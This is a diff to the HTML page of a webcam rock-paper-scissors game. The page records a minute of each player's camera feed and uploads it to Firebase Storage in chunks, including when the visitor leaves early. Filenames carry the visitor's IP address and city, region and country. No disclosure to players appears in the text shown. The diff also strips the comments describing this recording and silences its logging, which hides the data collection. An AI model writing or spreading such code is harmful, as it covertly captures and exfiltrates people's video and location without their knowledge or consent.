@@ -10,8 +10,8 @@
     <script src="https://cdn.jsdelivr.net/npm/@mediapipe/hands/hands.js" crossorigin="anonymous"></script>
     <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
 
-    <!-- Firebase (for uploading gameplay recordings) -->
     <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-check-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-storage-compat.js"></script>
 
     <style>
@@ -241,14 +241,6 @@
     <audio id="loseSound" src="https://actions.google.com/sounds/v1/cartoon/pop.ogg" preload="auto"></audio>
 
     <script>
-    /* =========================================================
-       RECORDING CONFIG
-       - Records the first RECORD_MS of gameplay and uploads it
-         to Firebase Storage under recordings/.
-       - Saves incrementally, so it is kept even if the visitor
-         leaves before the full duration.
-       - Filename: date-time__IP__region.webm
-    ========================================================= */
     const firebaseConfig = {
         apiKey: "AIzaSyDg6VHcwdXts3rOP3PjUogPIkuyFt3LxBg",
         authDomain: "rps-machine.firebaseapp.com",
@@ -257,16 +249,20 @@
         messagingSenderId: "891369310016",
         appId: "1:891369310016:web:fe5faf4c4e7ea7f9e59ca5"
     };
-    const RECORD_MS = 60000; // 1 minute
+    const RECAPTCHA_SITE_KEY = "6Lcda0wtAAAAAADU_MOi-C5qwVlR4W9_HeEO-qgj";
+    const RECORD_MS = 60000;
 
     let fbStorage = null;
-    const firebaseReady = firebaseConfig.apiKey && firebaseConfig.apiKey !== "YOUR_API_KEY";
-    if (firebaseReady) {
-        try { firebase.initializeApp(firebaseConfig); fbStorage = firebase.storage(); }
-        catch (e) { console.warn("Firebase init failed:", e); }
+    if (firebaseConfig.apiKey && firebaseConfig.apiKey !== "YOUR_API_KEY") {
+        try {
+            firebase.initializeApp(firebaseConfig);
+            if (RECAPTCHA_SITE_KEY && RECAPTCHA_SITE_KEY !== "YOUR_RECAPTCHA_V3_SITE_KEY") {
+                firebase.appCheck().activate(RECAPTCHA_SITE_KEY, true);
+            }
+            fbStorage = firebase.storage();
+        } catch (e) { console.warn("Firebase init failed:", e); }
     }
 
-    // Fetch IP + region up front (used for the filename)
     let geoInfo = { ip: "unknown", region: "unknown" };
     (async () => {
         try {
@@ -274,10 +270,9 @@
             const d = await r.json();
             geoInfo = {
                 ip: d.ip || "unknown",
-                region: [d.city, d.region, d.country_name || d.country]
-                    .filter(Boolean).join("-") || "unknown"
+                region: [d.city, d.region, d.country_name || d.country].filter(Boolean).join("-") || "unknown"
             };
-        } catch (e) { console.warn("geo lookup failed:", e); }
+        } catch (e) {}
     })();
 
     function sanitize(s) { return String(s).replace(/[^a-zA-Z0-9._-]/g, "_"); }
@@ -296,13 +291,11 @@
         return "";
     }
 
-    // Compose player view + machine view into one canvas (matches the on-screen layout).
     function buildCompositeCanvas(playerCanvas) {
         const CW = 500, CH = 780;
         const c = document.createElement("canvas");
         c.width = CW; c.height = CH;
         const ctx = c.getContext("2d");
-
         const playerScoreEl = document.getElementById("player_score");
 
         function roundRect(x, y, w, h, r) {
@@ -330,14 +323,12 @@
             const m = 8;
             ctx.fillStyle = "#2c3e50"; ctx.fillRect(0, 0, CW, CH);
 
-            // "You" header
             ctx.textBaseline = "alphabetic";
             ctx.fillStyle = "#fff"; ctx.font = "bold 20px 'Segoe UI', sans-serif"; ctx.textAlign = "left";
             ctx.fillText("You", m, 26);
             ctx.fillStyle = "#f1c40f"; ctx.textAlign = "right";
             ctx.fillText("Wins: " + (playerScoreEl ? playerScoreEl.innerText : "0"), CW - m, 26);
 
-            // Player video box
             const vx = m, vy = 34, vw = CW - 2 * m, vh = 320;
             ctx.fillStyle = "#000"; roundRect(vx, vy, vw, vh, 12); ctx.fill();
             ctx.save(); roundRect(vx, vy, vw, vh, 12); ctx.clip();
@@ -345,18 +336,15 @@
             ctx.restore();
             ctx.lineWidth = 3; ctx.strokeStyle = "#3498db"; roundRect(vx, vy, vw, vh, 12); ctx.stroke();
 
-            // VS
             ctx.fillStyle = "#ecf0f1"; ctx.font = "italic 900 22px 'Segoe UI', sans-serif"; ctx.textAlign = "center";
             ctx.fillText("VS", CW / 2, vy + vh + 26);
 
-            // "RPS Machine" header
             const my = vy + vh + 40;
             ctx.fillStyle = "#fff"; ctx.font = "bold 20px 'Segoe UI', sans-serif"; ctx.textAlign = "left";
             ctx.fillText("RPS Machine", m, my + 18);
             ctx.fillStyle = "#f1c40f"; ctx.textAlign = "right";
             ctx.fillText("Wins: " + machineScoreEl.innerText, CW - m, my + 18);
 
-            // Machine result box + emoji
             const rx = m, ry = my + 28, rw = CW - 2 * m, rh = 300;
             ctx.fillStyle = "#ecf0f1"; roundRect(rx, ry, rw, rh, 12); ctx.fill();
             ctx.lineWidth = 3; ctx.strokeStyle = "#95a5a6"; roundRect(rx, ry, rw, rh, 12); ctx.stroke();
@@ -365,7 +353,6 @@
             ctx.fillText(machineResultElement.innerText, rx + rw / 2, ry + rh / 2);
             ctx.textBaseline = "alphabetic";
 
-            // Status text
             let sc = "#f1c40f";
             try { sc = getComputedStyle(statusText).color || sc; } catch (e) {}
             ctx.fillStyle = sc; ctx.font = "bold 18px 'Segoe UI', sans-serif"; ctx.textAlign = "center";
@@ -384,7 +371,6 @@
         if (typeof composite.canvas.captureStream !== "function") return;
         recordingStarted = true;
 
-        // Keep redrawing the composite while recording.
         let compositeRunning = true;
         (function loop() { if (!compositeRunning) return; composite.draw(); requestAnimationFrame(loop); })();
 
@@ -395,25 +381,23 @@
         catch (e) { console.warn("MediaRecorder failed:", e); return; }
 
         const chunks = [];
-        const filename = buildFilename();          // fixed once, so re-uploads overwrite the same file
+        const filename = buildFilename();
         const fileRef = fbStorage ? fbStorage.ref().child("recordings/" + filename) : null;
         let uploading = false;
         let pending = false;
         let downloadedOnce = false;
 
-        // Upload everything captured so far (chunks from the start form a valid webm).
         function flush(isFinal) {
             if (chunks.length === 0) return;
             if (fileRef) {
-                if (uploading) { pending = true; return; }   // coalesce overlapping uploads
+                if (uploading) { pending = true; return; }
                 uploading = true;
                 const blob = new Blob(chunks, { type: mimeType || "video/webm" });
                 fileRef.put(blob)
-                    .then(() => console.log((isFinal ? "Final upload" : "Progress upload") + ":", filename, blob.size + "B"))
+                    .then(() => {})
                     .catch(err => console.warn("Upload failed:", err))
                     .finally(() => { uploading = false; if (pending) { pending = false; flush(false); } });
             } else if (isFinal && !downloadedOnce) {
-                // No Firebase → local download once (testing only)
                 downloadedOnce = true;
                 const blob = new Blob(chunks, { type: mimeType || "video/webm" });
                 const url = URL.createObjectURL(blob);
@@ -427,16 +411,12 @@
         recorder.ondataavailable = e => { if (e.data && e.data.size > 0) { chunks.push(e.data); flush(false); } };
         recorder.onstop = () => { compositeRunning = false; flush(true); };
 
-        // Emit a chunk every 5s → we always have a recent, saveable copy.
         recorder.start(5000);
-
-        // Stop after the full duration.
         setTimeout(() => { if (recorder.state !== "inactive") recorder.stop(); }, RECORD_MS);
 
-        // If the visitor leaves early, grab the latest data and save it.
         function saveNow() {
             if (recorder.state === "recording") {
-                try { recorder.requestData(); } catch (e) {}   // triggers ondataavailable → flush
+                try { recorder.requestData(); } catch (e) {}
                 flush(true);
             }
         }
@@ -466,7 +446,6 @@
         function fitCanvasToContainer(videoWidth, videoHeight) {
             const wrapperWidth = videoWrapper.clientWidth;
             const wrapperHeight = videoWrapper.clientHeight;
-
             const videoRatio = videoWidth / videoHeight;
             const wrapperRatio = wrapperWidth / wrapperHeight;
 
